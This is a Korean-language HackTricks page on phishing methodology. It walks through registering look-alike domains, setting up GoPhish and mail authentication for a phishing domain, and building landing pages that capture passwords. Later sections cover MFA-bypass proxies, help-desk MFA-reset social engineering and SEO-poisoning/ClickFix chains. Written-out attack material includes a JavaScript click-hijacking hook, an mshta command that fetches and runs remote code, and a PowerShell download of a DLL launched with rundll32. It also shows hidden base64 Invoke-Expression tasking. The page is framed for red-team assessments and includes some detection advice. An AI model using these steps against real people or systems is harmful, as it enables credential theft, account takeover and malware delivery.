# Phishing 방법론

{{#include ../../banners/hacktricks-training.md}}

## 방법론

1. 피해자 정찰
1. **피해자 도메인**을 선택합니다.
2. 기본적인 웹 열거를 수행하여 피해자가 사용하는 **로그인 포털을 검색**하고, 어떤 포털을 **사칭할지 결정**합니다.
3. **이메일을 찾기** 위해 **OSINT**를 활용합니다.
2. 환경 준비
1. Phishing assessment에 사용할 **도메인을 구매**합니다.
2. **이메일 서비스** 관련 레코드(SPF, DMARC, DKIM, rDNS)를 **구성**합니다.
3. VPS에 **gophish**를 구성합니다.
3. 캠페인 준비
1. **이메일 템플릿**을 준비합니다.
2. 자격 증명을 탈취할 **웹 페이지**를 준비합니다.
4. 캠페인을 시작합니다!

## 유사한 도메인 이름 생성 또는 신뢰할 수 있는 도메인 구매

### 도메인 이름 변형 기법

- **Keyword**: 도메인 이름에 원본 도메인의 중요한 **키워드가 포함**됩니다(예: zelster.com-management.com).<sup>[[1]](#references)</sup>
- **hypened subdomain**: 서브도메인의 **점(dot)을 하이픈으로 변경**합니다(예: www-zelster.com).
- **New TLD**: **새 TLD**를 사용하는 동일한 도메인입니다(예: zelster.org).
- **Homoglyph**: 도메인 이름의 문자를 **비슷하게 보이는 문자로 대체**합니다(예: zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** 도메인 이름 내의 **두 문자를 서로 바꿉니다**(예: zelsetr.com).
- **Singularization/Pluralization**: 도메인 이름 끝에 “s”를 추가하거나 제거합니다(예: zeltsers.com).
- **Omission**: 도메인 이름에서 문자 **하나를 제거**합니다(예: zelser.com).
- **Repetition:** 도메인 이름의 문자 **하나를 반복**합니다(예: zeltsser.com).
- **Replacement**: Homoglyph와 유사하지만 은밀성이 떨어집니다. 도메인 이름의 문자 하나를 대체하며, 원래 문자와 키보드상 가까운 문자를 사용할 수도 있습니다(예: zektser.com).
- **Subdomained**: 도메인 이름 내부에 **점(dot)을 삽입**합니다(예: ze.lster.com).
- **Insertion**: 도메인 이름에 문자를 **삽입**합니다(예: zerltser.com).
- **Missing dot**: TLD를 도메인 이름에 붙입니다(예: zelstercom.com).

**자동화 도구**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**웹사이트**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

태양 플레어, 우주선 또는 하드웨어 오류와 같은 다양한 요인으로 인해 저장되어 있거나 통신 중인 비트 중 일부가 **자동으로 뒤집힐 가능성**이 있습니다.

이 개념을 **DNS 요청에 적용하면**, **DNS 서버가 수신한 도메인**이 처음 요청된 도메인과 다를 수 있습니다.

예를 들어 "windows.com" 도메인의 단일 비트가 변경되면 "windnws.com"으로 바뀔 수 있습니다.

공격자는 피해자 도메인과 유사한 여러 **bit-flipping 도메인을 등록**하여 이를 **악용할 수 있습니다**. 공격자의 목적은 정상 사용자를 자신의 인프라로 리디렉션하는 것입니다.

자세한 내용은 [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)<sup>[[9]](#references)</sup>를 참고하세요.

### 신뢰할 수 있는 도메인 구매

[https://www.expireddomains.net/](https://www.expireddomains.net)에서 사용할 수 있는 만료된 도메인을 검색할 수 있습니다.\
구매하려는 만료 도메인이 **이미 양호한 SEO를 보유하고 있는지** 확인하려면 다음에서 해당 도메인이 어떻게 분류되어 있는지 검색할 수 있습니다.

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## 이메일 발견

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% 무료)
- [https://phonebook.cz/](https://phonebook.cz) (100% 무료)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

더 많은 유효한 이메일 주소를 **발견**하거나 이미 발견한 주소를 **검증**하려면, 피해자의 SMTP 서버에 대해 해당 주소를 brute-force할 수 있는지 확인할 수 있습니다. [여기에서 이메일 주소를 검증/발견하는 방법을 알아보세요](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
또한 사용자가 이메일에 액세스하기 위해 **웹 포털을 사용하는 경우**, 해당 포털이 **username brute force**에 취약한지 확인하고, 가능하다면 취약점을 exploit하는 것도 잊지 마세요.

## GoPhish 구성

### 설치

[https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)에서 다운로드할 수 있습니다.

`/opt/gophish` 내부에 다운로드하고 압축을 해제한 다음 `/opt/gophish/gophish`를 실행합니다.\
출력 결과의 3333 포트에 있는 admin user의 비밀번호가 제공됩니다. 따라서 해당 포트에 접속하고 해당 자격 증명을 사용하여 admin password를 변경합니다. 해당 포트를 local로 tunnel해야 할 수도 있습니다:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### 구성

**TLS 인증서 구성**

이 단계를 진행하기 전에 사용할 **도메인을 이미 구매**했어야 하며, 해당 도메인은 **gophish**를 구성하는 **VPS의 IP**를 **가리키고 있어야** 합니다.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**메일 설정**

설치를 시작합니다: `apt-get install postfix`

그런 다음 다음 파일에 도메인을 추가합니다:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

`/etc/postfix/main.cf` 내부의 다음 변수 값도 변경합니다:

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

마지막으로 **`/etc/hostname`** 및 **`/etc/mailname`** 파일을 도메인 이름으로 수정하고 **VPS를 재시작합니다.**

이제 `mail.<domain>`을 VPS의 **IP 주소**로 가리키는 **DNS A 레코드**를 생성하고, `mail.<domain>`을 가리키는 **DNS MX** 레코드를 생성합니다.

이제 이메일 전송을 테스트해 보겠습니다:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish 설정**

gophish 실행을 중지하고 설정을 구성합니다.\
`/opt/gophish/config.json`을 다음과 같이 수정합니다(https 사용에 유의):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**gophish 서비스 구성**

gophish 서비스를 생성하여 자동으로 시작되고 서비스로 관리할 수 있도록 하려면 다음 내용으로 `/etc/init.d/gophish` 파일을 생성합니다:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
다음과 같이 서비스 구성을 완료하고 확인합니다:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## 메일 서버와 도메인 구성

### 기다리고 정상적으로 보이기

도메인이 오래될수록 spam으로 감지될 가능성이 낮아집니다. 따라서 phishing assessment를 진행하기 전에 가능한 한 오래 기다려야 합니다(최소 1주일). 또한 평판이 좋은 분야에 대한 페이지를 게시하면 얻는 평판이 더 좋아집니다.

일주일을 기다려야 하더라도 지금 모든 구성을 완료할 수 있다는 점에 유의하세요.

### Reverse DNS (rDNS) 레코드 구성

VPS의 IP 주소가 도메인 이름으로 resolve되도록 rDNS (PTR) 레코드를 설정합니다.

### Sender Policy Framework (SPF) 레코드

**새 도메인에 SPF 레코드를 구성해야 합니다**. SPF 레코드가 무엇인지 모른다면 [**이 페이지를 읽어보세요**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

[https://www.spfwizard.net/](https://www.spfwizard.net)을 사용하여 SPF policy를 생성할 수 있습니다(VPS 시스템의 IP 사용).

![phishing 도메인의 SPF 레코드 생성을 위한 SPF Wizard 양식](<../../images/image (1037).png>)

다음은 도메인 내부의 TXT 레코드에 설정해야 하는 내용입니다:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) 레코드

**새 도메인에 DMARC 레코드를 구성해야 합니다**. DMARC 레코드가 무엇인지 모르는 경우 [**이 페이지를 읽어보세요**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

호스트 이름이 `_dmarc.<domain>`이고 다음 내용을 가리키는 새로운 DNS TXT 레코드를 생성해야 합니다:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

새 도메인에 대해 **DKIM을 구성해야 합니다**. DMARC 레코드가 무엇인지 모르는 경우 [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dkim)를 확인하세요.

이 tutorial은 다음을 기반으로 합니다: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)<sup>[[4]](#references)</sup>

> [!TIP]
> DKIM key가 생성하는 두 B64 값을 연결해야 합니다:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### email configuration score 테스트

[https://www.mail-tester.com/](https://www.mail-tester.com)을 사용하여 테스트할 수 있습니다\
페이지에 접속한 다음 해당 서비스에서 제공하는 address로 email을 보내세요:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
또한 `check-auth@verifier.port25.com`으로 이메일을 보내고 **응답을 확인하여** **이메일 구성을 확인할 수 있습니다**(이를 위해 **25**번 포트를 **열어야** 하며, root로 이메일을 보내면 _/var/mail/root_ 파일에서 응답을 확인할 수 있습니다).\
모든 테스트를 통과하는지 확인하세요:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
또한 **제어 중인 Gmail 계정으로 메시지를 전송**한 다음, Gmail 받은편지함에서 **이메일의 헤더**를 확인할 수도 있습니다. `Authentication-Results` 헤더 필드에 `dkim=pass`가 있어야 합니다.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Spamhaus Blacklist에서 제거

[www.mail-tester.com](https://www.mail-tester.com) 페이지에서 사용자의 domain이 spamhaus에 의해 차단되고 있는지 확인할 수 있습니다. 다음 주소에서 domain/IP 제거를 요청할 수 있습니다: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Microsoft Blacklist에서 제거

​​다음 주소에서 domain/IP 제거를 요청할 수 있습니다: [https://sender.office.com/](https://sender.office.com).

## GoPhish Campaign 생성 및 실행

### Sending Profile

- sender profile을 식별할 수 있도록 **이름을 지정**합니다.
- phishing emails을 전송할 account를 결정합니다. 제안: _noreply, support, servicedesk, salesforce..._
- username과 password는 비워 둘 수 있지만, Ignore Certificate Errors를 반드시 선택합니다.

![GoPhish Campaign 생성 및 실행 - Sending Profile: username과 password는 비워 둘 수 있지만, Ignore Certificate Errors를 반드시 선택합니다](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> 모든 항목이 정상적으로 작동하는지 테스트하려면 "**Send Test Email**" 기능을 사용하는 것이 좋습니다.\
> 테스트로 인해 blacklist에 등록되는 것을 방지하려면 **test emails을 10min mails 주소로 전송**하는 것을 권장합니다.

### Email Template

- template을 식별할 수 있도록 **이름을 지정**합니다.
- 그런 다음 **subject**를 작성합니다 (특별한 내용이 아닌, 일반적인 email에서 읽을 것으로 예상되는 내용을 작성합니다).
- "**Add Tracking Image**"가 선택되어 있는지 확인합니다.
- **email template**을 작성합니다 (다음 예시처럼 변수를 사용할 수 있습니다):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
참고로 **이메일의 신뢰도를 높이기 위해**, 클라이언트가 보낸 이메일의 서명을 사용하는 것이 좋습니다. 제안 사항:

- **존재하지 않는 주소**로 이메일을 보내고 응답에 서명이 포함되어 있는지 확인합니다.
- info@ex.com, press@ex.com 또는 public@ex.com과 같은 **공개 이메일**을 찾아 이메일을 보낸 후 응답을 기다립니다.
- **유효한 것으로 확인된** 이메일에 연락하고 응답을 기다립니다.

![Sending Profile - Email Template: 유효한 것으로 확인된 이메일에 연락하고 응답을 기다립니다](<../../images/image (80).png>)

> [!TIP]
> Email Template에서는 **전송할 파일을 첨부**할 수도 있습니다. 특수하게 조작된 파일/문서를 사용해 NTLM challenge도 탈취하려는 경우 [이 페이지를 읽어보세요](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- **이름**을 작성합니다.
- 웹 페이지의 **HTML code를 작성**합니다. 웹 페이지를 **import**할 수도 있습니다.
- **Capture Submitted Data** 및 **Capture Passwords**를 선택합니다.
- **redirection**을 설정합니다.

![Email Template - Landing Page: Capture Submitted Data 및 Capture Passwords 선택](<../../images/image (826).png>)

> [!TIP]
> 일반적으로 페이지의 HTML code를 수정하고 로컬에서 (일부 Apache server를 사용할 수도 있음) **결과가 만족스러울 때까지** 몇 가지 테스트를 수행해야 합니다. 그런 다음 해당 HTML code를 상자에 작성합니다.\
> HTML에 **static resources** (일부 CSS 및 JS 페이지 등)를 사용해야 하는 경우 _**/opt/gophish/static/endpoint**_에 저장한 후 _**/static/\<filename>**_에서 액세스할 수 있습니다.

> [!TIP]
> redirection의 경우 **피해자의 정상적인 메인 웹 페이지로 사용자를 redirect**하거나, 예를 들어 _/static/migration.html_로 redirect한 후 일부 **spinning wheel (**[**https://loading.io/**](https://loading.io)**)을 5초 동안 표시하고 프로세스가 성공했다고 알릴** 수 있습니다.

### Users & Groups

- 이름을 설정합니다.
- **데이터를 import**합니다 (예제의 template을 사용하려면 각 사용자의 firstname, last name 및 email address가 필요합니다).

![Landing Page - Users & Groups: 데이터를 import합니다 (예제의 template을 사용하려면 각 사용자의 firstname, last name 및 email address가 필요합니다)](<../../images/image (163).png>)

### Campaign

마지막으로 이름, email template, landing page, URL, sending profile 및 group을 선택하여 campaign을 생성합니다. URL은 피해자에게 전송되는 링크입니다.

**Sending Profile에서는 최종 phishing email이 어떻게 표시되는지 확인하기 위해 test email을 보낼 수 있습니다**:

![Users & Groups - Campaign: Sending Profile에서는 최종 phishing email이 어떻게 표시되는지 확인하기 위해 test email을 보낼 수 있습니다](<../../images/image (192).png>)

> [!TIP]
> 테스트 중 blacklist에 등록되는 것을 방지하기 위해 **test email을 10min mail address로 보내는 것**을 권장합니다.

모든 준비가 완료되면 campaign을 launch합니다!

## Website Cloning

어떤 이유로든 웹 사이트를 clone하려는 경우 다음 페이지를 확인하세요:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

일부 phishing assessment (주로 Red Team 대상)에서는 일종의 **backdoor가 포함된 파일** (C2 또는 authentication을 trigger하는 파일 등)도 **전송**하려 할 수 있습니다.\
몇 가지 예시는 다음 페이지를 확인하세요:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

앞선 attack은 실제 웹 사이트를 위조하고 사용자가 입력한 정보를 수집하므로 매우 정교합니다. 하지만 사용자가 올바른 password를 입력하지 않았거나 위조한 application이 2FA로 구성되어 있다면, **이 정보만으로는 속은 사용자를 impersonate할 수 없습니다**.

이때 [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) 및 [**muraena**](https://github.com/muraenateam/muraena)와 같은 tools가 유용합니다. 이 tool을 사용하면 MitM과 유사한 attack을 생성할 수 있습니다. 기본적으로 attack은 다음과 같이 작동합니다:

1. 실제 웹 페이지의 **login** form을 **impersonate**합니다.
2. 사용자가 **credentials**를 fake page로 **전송**하면 tool이 이를 실제 웹 페이지로 전송하고, **credentials가 작동하는지 확인**합니다.
3. 계정이 **2FA**로 구성되어 있다면 MitM page가 이를 요청하고, **사용자가 입력**하면 tool이 실제 웹 페이지로 전송합니다.
4. 사용자가 authentication되면 MitM을 수행하는 동안의 모든 상호작용에서 (attacker인) 사용자는 **credentials, 2FA, cookie 및 모든 정보**를 **captured**하게 됩니다.

### Via VNC

원본과 동일하게 보이는 **malicious page로 피해자를 보내는 것** 대신, 실제 웹 페이지에 연결된 browser가 있는 **VNC session으로 보내면** 어떨까요? 사용자가 하는 일을 확인하고 password, 사용된 MFA, cookie 등을 탈취할 수 있습니다.\
[**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)<sup>[[3]](#references)</sup>로 이를 수행할 수 있습니다.

## Detecting the detection

물론 발각되었는지 확인하는 가장 좋은 방법 중 하나는 **blacklist에서 자신의 domain을 검색하는 것**입니다. 목록에 표시된다면 어떤 방식으로든 domain이 의심스러운 것으로 detect된 것입니다.\
domain이 blacklist에 표시되는지 확인하는 간단한 방법은 [https://malwareworld.com/](https://malwareworld.com)을 사용하는 것입니다.

하지만 다음에 설명된 것처럼 피해자가 **실제 환경에서 의심스러운 phishing activity를 적극적으로 찾고 있는지** 확인하는 다른 방법도 있습니다:


{{#ref}}
detecting-phising.md
{{#endref}}

피해자의 domain과 이름이 매우 유사한 **domain을 구매**하거나, 자신이 제어하는 domain의 **subdomain**에 피해자 domain의 **keyword가 포함된 certificate를 생성**할 수 있습니다. **피해자**가 이들과 어떤 종류의 **DNS 또는 HTTP interaction**이라도 수행하면, 피해자가 의심스러운 domain을 **적극적으로 찾고 있다는 사실**을 알 수 있으므로 매우 stealth하게 행동해야 합니다.<sup>[[2]](#references)</sup>

### Evaluate the phishing

[**Phishious** ](https://github.com/Rices/Phishious)를 사용하여 이메일이 spam folder로 들어갈지, 차단될지 또는 성공할지 평가합니다.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Modern intrusion set은 email lure를 완전히 생략하고 **service-desk / identity-recovery workflow를 직접 target하여** MFA를 무력화하는 경우가 점점 늘고 있습니다. 이 attack은 완전히 "living-off-the-land" 방식입니다. 즉, operator가 유효한 credentials를 확보하면 malware 없이 built-in admin tooling을 사용하여 pivot합니다.<sup>[[5]](#references)</sup>

### Attack flow
1. 피해자를 Recon합니다.
* LinkedIn, data breach, public GitHub 등에서 개인 및 corporate details를 수집합니다.
* high-value identity (executive, IT, finance)를 식별하고 password / MFA reset을 위한 **정확한 help-desk process**를 파악합니다.
2. Real-time social engineering
* target을 impersonate하여 phone, Teams 또는 chat으로 help-desk에 연락합니다 (대개 **spoofed caller-ID** 또는 **cloned voice** 사용).
* 사전에 수집한 PII를 제공하여 knowledge-based verification을 통과합니다.
* agent가 **MFA secret을 reset**하거나 등록된 mobile number에 대해 **SIM-swap**을 수행하도록 설득합니다.
3. Immediate post-access actions (실제 사례에서는 ≤60 min)
* 모든 web SSO portal을 통해 foothold를 확보합니다.
* built-in tool을 사용해 AD / AzureAD를 enumerate합니다 (binaries를 drop하지 않음):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* 환경에서 이미 whitelist된 **WMI**, **PsExec** 또는 정상적인 **RMM** agent를 사용해 lateral movement를 수행합니다.

### Detection & Mitigation
* help-desk identity recovery를 **privileged operation**으로 취급하고 step-up auth 및 manager approval을 요구합니다.
* 다음 항목에 alert하는 **Identity Threat Detection & Response (ITDR)** / **UEBA** rule을 deploy합니다:
* MFA method 변경 + new device / geo에서의 authentication.
* 동일한 principal의 즉각적인 elevation (user-→-admin).
* help-desk call을 record하고 reset 전에 **이미 등록된 number로 call-back**하도록 강제합니다.
* 새로 reset된 account가 high-privilege token을 자동으로 상속하지 않도록 **Just-In-Time (JIT) / Privileged Access**를 구현합니다.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crew는 mass attack을 통해 high-touch operation의 비용을 상쇄하며, **search engine 및 ad network를 delivery channel로 전환**합니다.<sup>[[5]](#references)</sup>

1. **SEO poisoning / malvertising**은 `chromium-update[.]site`와 같은 fake result를 search ad 상단에 노출합니다.
2. 피해자는 작은 **first-stage loader** (대개 JS/HTA/ISO)를 download합니다. Unit 42에서 확인된 예:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader는 browser cookie와 credential DB를 exfiltrate한 다음, 어떤 동작을 수행할지 *realtime*으로 결정하는 **silent loader**를 가져옵니다:
* RAT (예: AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* 새로 등록된 domain을 block하고 e-mail뿐만 아니라 *search-ad*에도 **Advanced DNS / URL Filtering**을 enforce합니다.
* software installation을 signed MSI / Store package로 제한하고, policy를 통해 `HTA`, `ISO`, `VBS` execution을 deny합니다.
* browser가 installer를 여는 child process를 monitor합니다:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* first-stage loader가 자주 abuse하는 LOLBin (예: `regsvr32`, `curl`, `mshta`)을 hunt합니다.

### Download-button click hijacking with TDS handoff
일부 fake software portal은 표시되는 download `href`가 **실제 GitHub/release URL**을 가리키도록 유지하지만, JavaScript에서 사용자의 **첫 번째** interaction을 hijack하여 대신 피해자를 **Traffic Distribution System (TDS)** chain으로 보냅니다.<sup>[[8]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
주요 특징:
- hook은 일반적으로 `document`의 **capture phase**(`true`)에서 실행되므로 site handler보다 먼저 호출됩니다.
- Chrome은 redirect를 유효한 **user gesture**에 연결하고 popup-blocker 우회를 개선하기 위해 `click` 대신 `mousedown`을 사용하는 경우가 많습니다.
- 일부 변형은 `about:blank`을 미리 열거나 `<a target="_blank">` click을 합성한 다음, 나중에 TDS URL을 할당합니다.
- Browser-side cap은 일반적으로 `localStorage`에 저장되므로 **첫 번째 click**은 malware로 연결될 수 있지만, refresh/retry 시에는 정상적으로 보이는 link로 돌아갈 수 있습니다.
- TDS는 referrer, entry domain, GEO, browser/device fingerprint, VPN/datacenter 검사, click context, session별 counter를 기준으로 접근을 제어할 수 있어 analyst replay 결과가 일관되지 않을 수 있습니다.

Defender 아이디어:
- 표시된 `href`와 click 시점에 생성되는 **실제 navigation target**을 비교합니다.
- `window.open`, `about:blank` 또는 합성된 anchor click 주변에서 `preventDefault()`와 `stopImmediatePropagation()`을 모두 호출하는 `document.addEventListener(..., true)` handler를 탐지합니다.
- 새로 등록된 software-download domain들이 모두 동일한 CloudFront/JS stage를 로드한다면, 이를 높은 신뢰도의 SEO-poisoning/TDS pattern으로 간주합니다.

### 가짜 verification page + archive처럼 보이는 LOLBAS fetch를 이용한 ClickFix
일부 TDS branch는 피해자에게 다음과 같은 trusted Windows binary를 실행하도록 안내하는 가짜 verification page(Cloudflare/IUAM style)로 연결됩니다:<sup>[[8]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
메모:
- `mshta.exe`는 URL이 `.7z` archive인 것처럼 가장하더라도 response 시작 부분의 **HTA/VBScript를 실행**합니다. 뒤에 추가된 archive data는 순수한 미끼일 수 있습니다.
- 후속 stage에서는 file type에 대해 계속 거짓말하는 경우가 많습니다(`.rtf`를 PowerShell에, `.asar`를 Python에 사용하거나 padding된 binary가 포함된 ZIP 사용). 그런 다음 **manual PE mapping / in-memory execution**으로 전환합니다.
- 이러한 chain 중 하나에 대응하는 경우, 첫 번째 successful run부터 **network + memory를 보존**하십시오. 이후 replay에서는 benign installer/SFX path만 표시되거나, payload/key release가 원래 TDS session에 연결되어 있어 실패할 수 있습니다.

### ClickFix DLL delivery tradecraft (가짜 CERT update)
* Lure: **Update** button을 표시하는 cloned national CERT advisory. 이 button은 단계별 “fix” instructions를 보여 줍니다. Victim에게 DLL을 download한 뒤 `rundll32`로 실행하는 batch를 실행하도록 안내합니다.<sup>[[8]](#references)</sup>
* Typical batch chain observed:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest`는 payload를 `%TEMP%`에 drop하고, 짧은 sleep은 network jitter를 숨긴 다음, `rundll32`가 exported entrypoint(`notepad`)를 호출합니다.
* DLL은 host identity를 beacon하고 몇 분마다 C2를 polling합니다. Remote tasking은 **base64-encoded PowerShell** 형태로 전달되며, policy bypass와 함께 hidden 상태로 실행됩니다.
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* 이를 통해 C2 flexibility를 유지할 수 있습니다(server는 DLL을 update하지 않고도 task를 교체할 수 있음). 또한 console window를 숨깁니다. `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`을 함께 사용하는 `rundll32.exe`의 PowerShell child를 hunt하십시오.
* Defenders는 `...page.php?tynor=<COMPUTER>sss<USER>` 형식의 HTTP(S) callback과 DLL load 이후 5분 polling interval을 확인할 수 있습니다.

---

## AI 강화 Phishing Operations
Attackers는 이제 **LLM 및 voice-clone API**를 chain으로 연결하여 완전히 개인화된 lure와 real-time interaction을 수행합니다.

| Layer | Threat actor의 example use |
|-------|-----------------------------|
|Automation|무작위화된 wording 및 tracking link를 사용하여 100 k건 이상의 email / SMS를 generate & send합니다.|
|Generative AI|공개된 M&A 내용과 social media의 내부 농담을 참조하는 *one-off* email을 생성하고, callback scam에서 CEO의 deep-fake voice를 사용합니다.|
|Agentic AI|Domain을 autonomously register하고, open-source intel을 scrape하며, victim이 click했지만 credential을 submit하지 않은 경우 next-stage mail을 작성합니다.|

**Defence:**
• 신뢰할 수 없는 automation에서 전송된 message를 강조하는 **dynamic banner**를 추가합니다(ARC/DKIM anomaly를 통해).
• 고위험 phone request에는 **voice-biometric challenge phrase**를 적용합니다.
• Awareness programme에서 AI-generated lure를 지속적으로 simulate합니다 – static template은 obsolete 상태입니다.

Credential phishing을 위한 agentic browsing abuse도 참조하십시오:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Secrets inventory 및 detection을 위한 local CLI tool과 MCP에 대한 AI agent abuse도 참조하십시오:

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

